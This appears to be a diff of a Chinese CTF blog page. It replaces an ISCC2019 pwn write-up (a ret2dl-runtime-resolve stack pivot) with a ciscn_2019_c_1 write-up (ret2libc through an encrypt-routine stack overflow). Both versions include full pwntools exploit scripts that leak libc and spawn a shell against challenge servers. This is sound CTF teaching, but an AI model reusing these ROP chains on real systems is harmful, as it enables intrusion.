@@ -15,19 +15,17 @@
 
 
 
-<meta name="description" content="ret2-dl-runtime-resolve">
+<meta name="description" content="说起来这题算是国赛过程中自己做的唯一一题2333，tcl">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ISCC2019-pwn01">
-<meta property="og:url" content="http://yoursite.com/2019/05/19/ISCC2019-pwn01/index.html">
+<meta property="og:title" content="ciscn_2019_c_1">
+<meta property="og:url" content="http://yoursite.com/2019/07/30/ciscn-2019-c-1/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="ret2-dl-runtime-resolve">
+<meta property="og:description" content="说起来这题算是国赛过程中自己做的唯一一题2333，tcl">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/006tNc79gy1g36zvw2go6j31iy07swgk.jpg">
-<meta property="og:updated_time" content="2019-05-19T14:35:23.517Z">
+<meta property="og:updated_time" content="2019-07-30T05:04:00.892Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ISCC2019-pwn01">
-<meta name="twitter:description" content="ret2-dl-runtime-resolve">
-<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/006tNc79gy1g36zvw2go6j31iy07swgk.jpg">
+<meta name="twitter:title" content="ciscn_2019_c_1">
+<meta name="twitter:description" content="说起来这题算是国赛过程中自己做的唯一一题2333，tcl">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -59,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>ISCC2019-pwn01 | 4eriri&#39;s blog</title>
+<title>ciscn_2019_c_1 | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -191,11 +189,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-ISCC2019-pwn01" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-ciscn-2019-c-1" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/05/19/ISCC2019-pwn01/" class="article-date">
-      <time datetime="2019-05-19T14:13:04.000Z" itemprop="datePublished">2019-05-19</time>
+      <a href="/2019/07/30/ciscn-2019-c-1/" class="article-date">
+      <time datetime="2019-07-30T04:52:30.000Z" itemprop="datePublished">2019-07-30</time>
 </a>
 
 
@@ -210,7 +208,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      ISCC2019-pwn01
+      ciscn_2019_c_1
     </h1>
   
 
@@ -227,20 +225,16 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/#ret2_dl_runtime_resolve" target="_blank" rel="noopener">ret2-dl-runtime-resolve</a></p>
+        <p>说起来这题算是国赛过程中自己做的唯一一题2333，tcl</p>
 <a id="more"></a>
-<h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char dest; // [esp+0h] [ebp-16h]</span><br><span class="line">  size_t n; // [esp+Ah] [ebp-Ch]</span><br><span class="line">  int *v6; // [esp+Eh] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = &amp;argc;</span><br><span class="line">  n = read(0, &amp;buf, 0xF4240u);</span><br><span class="line">  memcpy(&amp;dest, &amp;buf, n);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>是很标准的ret2-dl-runtime-resolve例题了，需要注意的是需要看汇编：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:080484AE                 lea     esp, [ebp-8]</span><br><span class="line">.text:080484B1                 pop     ecx</span><br><span class="line">.text:080484B2                 pop     ebx</span><br><span class="line">.text:080484B3                 pop     ebp</span><br><span class="line">.text:080484B4                 lea     esp, [ecx-4]</span><br><span class="line">.text:080484B7                 retn</span><br></pre></td></tr></table></figure>
-<p>函数结尾处的汇编是这样的，意味着不能简单地填充溢出，和之前那道DDCTF的pwn一样，需要在特定位置输入正确的值才可以。</p>
-<p>不过这一题不一样的是，我们可以直接控制ebp,esp到buf上，然后buf上的数据是受我们输入控制的，再配合一些gadgets就可以完成调用read函数并且换栈。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh.send(&apos;aabbbbccccdddd&apos;+p32(buf+30)+p32(0)+p32(buf+26)+p32(read_plt)+p32(ppp_ret)+p32(0)+p32(stage)+p32(100)+p32(pop_ret)+p32(stage)+p32(leave_ret))</span><br></pre></td></tr></table></figure>
-<p>像这样就可以把栈换到stage处，接下来就是标准的ret2-dl-runtime-resolve，详细地原理介绍看CTF-WIKI就可以了。</p>
-<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># coding=UTF-8from pwn import *#sh=process(&quot;./pwn01.dms&quot;)sh=remote(&quot;39.100.87.24&quot;,8101)elf=ELF(&apos;./pwn01.dms&apos;)bss=elf.bss()read_plt=elf.plt[&apos;read&apos;]buf=bss+0x20stage=buf+0x282#stage=buf+28pop_ret=0x0804851bppp_ret=0x08048519leave_ret=0x080483c5#gdb.attach(sh)sh.send(&apos;aabbbbccccdddd&apos;+p32(buf+30)+p32(0)+p32(buf+26)+p32(read_plt)+p32(ppp_ret)+p32(0)+p32(stage)+p32(100)+p32(pop_ret)+p32(stage)+p32(leave_ret))#sh.send(&apos;aabbbbccccdddd&apos;+p32(buf+32)+p32(0)+p32(buf+28)+&apos;aa&apos;+payload2)plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addrrel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addrdynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addrdynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addrindex_offset = stage + 28 - rel_pltread_got = elf.got[&apos;read&apos;]read_index = (elf.plt[&apos;read&apos;] - plt0) / 16 - 1read_index *= 8r_offset=0x0804a00cfake_sym_addr = stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10  st_name = fake_sym_addr + 0x10 - dynstrfake_write_sym = flat([st_name, 0, 0, 0x12])r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([read_got, r_info])payload=&apos;aaaa&apos;+p32(plt0)+p32(index_offset)+&apos;aaaa&apos;+p32(stage+84)+&apos;aaaa&apos;+&apos;aaaa&apos;+fake_write_reloc+&apos;a&apos;*align+fake_write_sym+&apos;system\x00&apos;payload+=&apos;a&apos;*(84-len(payload))payload+=&apos;sh\x00&apos;sh.send(payload)#sh.send(payload2)sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>基本照抄CTF-WIKI，有的偏移和CTF-WIKI不一样，是因为换栈的方式不一样，我的EXP在第二次使用read函数时，开头四个字符需要输入一个填充，来让<code>leave,ret</code>中<code>pop,ebp</code>时pop，这样后面所有的伪造的结构的地址都要+4。</p>
-<p>这题写了很久很久……主要是因为卡在了换栈的位置选择，我之前一直选择bss+400的位置，结果在调用dl_fixup时一直会报错，以为是换栈之类的出了问题，试了很久都不知道为啥，最终要感谢看雪论坛师傅mengllong的评论解救了我：</p>
-<p><img src="http://ww3.sinaimg.cn/large/006tNc79gy1g36zvw2go6j31iy07swgk.jpg" alt=""></p>
-<p>最后尝试了一下，至少要在bss+0x2a2的位置才不会出错2333</p>
+<h1 id="程序功能"><a href="#程序功能" class="headerlink" title="程序功能"></a>程序功能</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.Encrypt</span><br><span class="line">2.Decrypt</span><br></pre></td></tr></table></figure>
+<p>其实只有一个功能Encrypt，Decrypt需要自己手动操作。</p>
+<h1 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h1><p>Encrypt中存在栈溢出</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>Encrypt会对输入进行加密，所以要让输入被加密后构成有效的ROP。</p>
+<p>之前被加密过位置的就不会再被加密。例如第一次输入了a，加密后变成l，第二次输入aa，就只有第二个a会被加密，加密后变成al。</p>
+<p>main函数地址为0x400b28，若输入为0x4e0b28，加密后恰好能变成main函数地址。用这个输入多填充几个地址，确保之后构造ROP时不会被加密。</p>
+<p>比赛时没给libc，但差别不大，这次就按有libc来做了。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8from pwn import *sh=remote(&quot;buuoj.cn&quot;,20115)#sh=process(&apos;/media/psf/Home/Desktop/Challenges/BUUpwn/ciscn_2019_c_1.dms&apos;,env=&#123;&quot;LD_PRELOAD&quot;:&apos;./x64_libc.so.6&apos;&#125;)elf=ELF(&apos;/media/psf/Home/Desktop/Challenges/BUUpwn/ciscn_2019_c_1.dms&apos;)libc=ELF(&apos;./x64_libc.so.6&apos;)def send(content):	sh.recvuntil(&quot;Input your choice!\n&quot;)	sh.sendline(&quot;1&quot;)	sh.recvuntil(&quot;Input your Plaintext to be encrypted\n&quot;)	sh.sendline(content)main=0x400B28main_enc=0x4e0b28pop_rdi=0x400c83send(&apos;a&apos;*0x58+p64(main_enc)*10)send(&apos;a&apos;*0x58+p64(pop_rdi)+p64(elf.got[&apos;puts&apos;])+p64(elf.plt[&apos;puts&apos;])+p64(main))sh.recvuntil(&apos;@\n&apos;)leak=u64(sh.recv(6).ljust(8,&apos;\x00&apos;))libc_base=leak-libc.sym[&apos;puts&apos;]log.success(&quot;libcbase: &quot;+hex(libc_base))send(&apos;a&apos;*0x58+p64(pop_rdi)+p64(libc_base+0x18cd57)+p64(libc_base+libc.sym[&apos;system&apos;]))sh.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -249,13 +243,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/05/19/ISCC2019-pwn01/">ISCC2019-pwn01</a></p>
+        <p><span>本文标题:</span><a href="/2019/07/30/ciscn-2019-c-1/">ciscn_2019_c_1</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2019-05-19, 22:13:04</p>
-        <p><span>最后更新:</span>2019-05-19, 22:35:23</p>
+        <p><span>发布时间:</span>2019-07-30, 12:52:30</p>
+        <p><span>最后更新:</span>2019-07-30, 13:04:00</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/05/19/ISCC2019-pwn01/" title="ISCC2019-pwn01">http://yoursite.com/2019/05/19/ISCC2019-pwn01/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/05/19/ISCC2019-pwn01/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/07/30/ciscn-2019-c-1/" title="ciscn_2019_c_1">http://yoursite.com/2019/07/30/ciscn-2019-c-1/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/07/30/ciscn-2019-c-1/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -267,16 +261,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/05/30/安恒杯2019年5月月赛/">
-                    安恒杯2019年5月月赛
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/05/16/DDCTF2019-pwn/">
-                    DDCTF2019-pwn
+                <a href="/2019/07/29/babyheap-0ctf-2017/">
+                    babyheap_0ctf_2017
                 </a>
             </div>
         
@@ -288,7 +276,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单分析"><span class="toc-number">1.</span> <span class="toc-text">简单分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">2.</span> <span class="toc-text">EXP</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#程序功能"><span class="toc-number">1.</span> <span class="toc-text">程序功能</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#程序漏洞"><span class="toc-number">2.</span> <span class="toc-text">程序漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li></ol>
         
     </div>
     <style>
@@ -324,7 +312,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"ISCC2019-pwn01　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"ciscn_2019_c_1　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -343,8 +331,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://yoursite.com/2019/05/19/ISCC2019-pwn01/';
-            this.page.identifier = '2019/05/19/ISCC2019-pwn01/';
+            this.page.url = 'http://yoursite.com/2019/07/30/ciscn-2019-c-1/';
+            this.page.identifier = '2019/07/30/ciscn-2019-c-1/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -366,15 +354,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/05/30/安恒杯2019年5月月赛/" title="上一篇: 安恒杯2019年5月月赛">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/05/16/DDCTF2019-pwn/" title="下一篇: DDCTF2019-pwn">
+            <a href="/2019/07/29/babyheap-0ctf-2017/" title="下一篇: babyheap_0ctf_2017">
                 <i class="fa fa-angle-right"></i>
             </a>
         
